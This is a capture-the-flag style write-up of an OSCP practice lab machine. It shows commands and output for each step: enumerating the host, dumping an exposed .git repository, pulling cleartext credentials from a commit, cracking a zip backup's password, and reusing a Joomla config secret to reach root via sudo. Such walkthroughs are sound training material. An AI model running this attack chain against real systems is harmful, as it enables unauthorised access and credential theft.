##### Tags: `.git`  `adm`  `sudo -i`  `zip2john`  `cms`

# 🐧OSCP-A 144🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.158.144                 

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
port 21 ftp unable to login with anonymous  
port 80 is Apache webpage  
use gobuster found .git
```console
$ gobuster dir -u http://192.168.158.144 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -b 404
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.158.144
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git/HEAD            (Status: 200) [Size: 21]
```
use git_dumper to dump the data of the page
```console
$ python3 git_dumper.py http://192.168.158.144/.git/ dir
[-] Testing http://192.168.158.144/.git/HEAD [200]
[-] Testing http://192.168.158.144/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://192.168.158.144/.git/ [200]
[-] Fetching http://192.168.158.144/.gitignore [404]
[-] http://192.168.158.144/.gitignore responded with status code 404
[-] Fetching http://192.168.158.144/.git/index [200]
[-] Fetching http://192.168.158.144/.git/configuration/ [200]
[-] Fetching http://192.168.158.144/.git/hooks/ [200]
[-] Fetching http://192.168.158.144/.git/api/ [200]
```
check the logs
```console
$ git log                                                                                              
commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
Author: Stuart <luke@challenge.pwk>
Date:   Fri Nov 18 16:58:34 2022 -0500

    Security Update

commit 621a2e79b3a4a08bba12effe6331ff4513bad91a (origin/main, origin/HEAD)
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 23:57:12 2022 +0200

    Create database.php

commit c9c8e8bd0a4b373190c4258e16e07a6296d4e43c
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 23:56:19 2022 +0200

    Delete database.php
```
found the username and password in one of the log
```console
$ git show 44a055daf7a0cd777f28f444c0d29ddf3ff08c54
commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
Author: Stuart <luke@challenge.pwk>
Date:   Fri Nov 18 16:58:34 2022 -0500

    Security Update

diff --git a/configuration/database.php b/configuration/database.php
index 55b1645..8ad08b0 100644
--- a/configuration/database.php
+++ b/configuration/database.php
@@ -2,8 +2,9 @@
 class Database{
     private $host = "localhost";
     private $db_name = "staff";
-    private $username = "stuart@challenge.lab";
-    private $password = "BreakingBad92";
+    private $username = "";
+    private $password = "";
+// Cleartext creds cannot be added to public repos!
     public $conn;
     public function getConnection() {
         $this->conn = null;
```
ssh logged in successful
```console
$ ssh stuart@192.168.158.144
stuart@oscp:~$ id
uid=1000(stuart) gid=1000(stuart) groups=1000(stuart),4(adm),24(cdrom),30(dip),46(plugdev)
```
## Privilege Escalation

we are in adm group means we can read /var/log files  
found 3 backup files in /opt/backup
```console
stuart@oscp:/opt/backup$ ls -la
total 92
drwxr-xr-x 2 root   root    4096 Nov 18  2022 .
drwxr-xr-x 3 root   root    4096 Nov 18  2022 ..
-rw-r--r-- 1 stuart stuart 26890 Apr  5  2018 sitebackup1.zip
-rw-r--r-- 1 stuart stuart 24701 Nov 18  2022 sitebackup2.zip
-rw-r--r-- 1 stuart stuart 25312 Mar  5  2020 sitebackup3.zip
```
transfer back to our machine  
only sitebackup3.zip is a zip file and requires password
```console
$ file *              
sitebackup1.zip: data
sitebackup2.zip: data
sitebackup3.zip: Zip archive data, made by v6.3 UNIX, extract using at least v2.0, last modified Nov 17 2022 10:39:20, uncompressed size 0, method=store
```
zip2john and cracked the password
```console
$ zip2john sitebackup3.zip > hash.txt

$ john --wordlist=/home/ming/Downloads/rockyou.txt hash.txt            
Using default input encoding: UTF-8
Loaded 19 password hashes with 19 different salts (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Loaded hashes with cost 1 (HMAC size) varying from 28 to 6535
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
codeblue         (sitebackup3.zip/joomla/language/.DS_Store)     
```
unzip the file with the password
```console
$ 7z x sitebackup3.zip
```
there are the backup of the port 80 cms webpage
```console
$ ls -la
total 136
drwxr-xr-x 17 ming ming  4096 Nov 18  2022 .
drwxrwxr-x  3 ming ming  4096 Jun 13 19:06 ..
drwxr-xr-x  2 ming ming  4096 Nov 18  2022 administrator
drwxr-xr-x  2 ming ming  4096 Nov 18  2022 api
drwxr-xr-x  2 ming ming  4096 Oct 26  2022 cache
drwxr-xr-x  2 ming ming  4096 Oct 26  2022 cli
drwxr-xr-x  2 ming ming  4096 Nov 18  2022 components
-rw-r--r--  1 ming ming  2018 Oct 26  2022 configuration.php
-rw-r--r--  1 ming ming 14340 Nov 18  2022 .DS_Store
-rw-r--r--  1 ming ming  6858 Oct 26  2022 htaccess.txt
drwxr-xr-x  2 ming ming  4096 Nov 18  2022 images
drwxr-xr-x  2 ming ming  4096 Oct 26  2022 includes
-rw-r--r--  1 ming ming  1068 Oct 26  2022 index.php
drwxr-xr-x  3 ming ming  4096 Nov 18  2022 language
drwxr-xr-x  2 ming ming  4096 Nov 18  2022 layouts
drwxr-xr-x  2 ming ming  4096 Nov 18  2022 libs
-rw-r--r--  1 ming ming 18092 Oct 26  2022 LICENSE.txt
drwxr-xr-x  2 ming ming  4096 Nov 18  2022 media
drwxr-xr-x  2 ming ming  4096 Nov 18  2022 modules
drwxr-xr-x  2 ming ming  4096 Nov 18  2022 plugins
-rw-r--r--  1 ming ming  4942 Oct 26  2022 README.txt
-rw-r--r--  1 ming ming   764 Oct 26  2022 robots.txt
drwxr-xr-x  2 ming ming  4096 Nov 18  2022 templates
drwxr-xr-x  2 ming ming  4096 Oct 26  2022 tmp
-rw-r--r--  1 ming ming  2974 Oct 26  2022 web.config.txt
```
found the user and password in configuration.php file
```console
$ cat configuration.php
<?php
class JConfig {
        public $secret = 'Ee24zIK4cDhJHL4H';
        public $mailfrom = 'chloe@challenge.lab';
```
su to chloe with the password
```console
stuart@oscp:/home$ su chloe
Password: Ee24zIK4cDhJHL4H

chloe@oscp:/home$ id
uid=1011(chloe) gid=1011(chloe) groups=1011(chloe),27(sudo)
```
chloe is in sudo group  
just sudo -i with escalate to root
```console
chloe@oscp:/home$ sudo -i
[sudo] password for chloe: Ee24zIK4cDhJHL4H

root@oscp:~# id
uid=0(root) gid=0(root) groups=0(root)
```
